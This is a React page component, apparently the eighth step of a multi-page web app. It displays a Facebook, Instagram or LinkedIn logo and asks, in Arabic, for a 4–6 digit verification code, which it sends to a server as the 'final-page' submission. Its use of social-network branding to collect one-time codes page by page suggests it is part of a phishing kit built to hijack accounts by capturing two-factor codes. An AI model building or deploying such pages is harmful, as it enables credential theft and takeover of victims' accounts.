import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import {
  TiSocialFacebook,
  TiSocialInstagram,
  TiSocialLinkedin,
} from "react-icons/ti";
import { currentPage, logo, sendDataToServer } from "../../context/signals";

function Page8() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    sendDataToServer(data, "page8", "final-page", true);
  }

  useEffect(() => {
    currentPage.value = "page8";
  }, []);
  return (
    <Main>
      <form
        className="flex flex-col gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <div className="flex justify-center">
          {logo.value === "facebook" ? (
            <TiSocialFacebook className="text-main text-5xl" />
          ) : logo.value === "instagram" ? (
            <TiSocialInstagram className="text-main text-5xl" />
          ) : (
            <TiSocialLinkedin className="text-main text-5xl" />
          )}
        </div>

        <Input
          errors={errors}
          register={register}
          id="code"
          label="الرمز"
          type="password"
          isAr
          options={{
            required: "هذه الحقل ضروري",
            pattern: {
              value: /^\d{4,6}$/,
              message: "يجب كتابة رمز مكون من اربع إلى ست ارقام",
            },
          }}
        />

        <Button className={MAIN_BTN + " w-[150px] mx-auto"}>تحقق</Button>
      </form>
    </Main>
  );
}

export default Page8;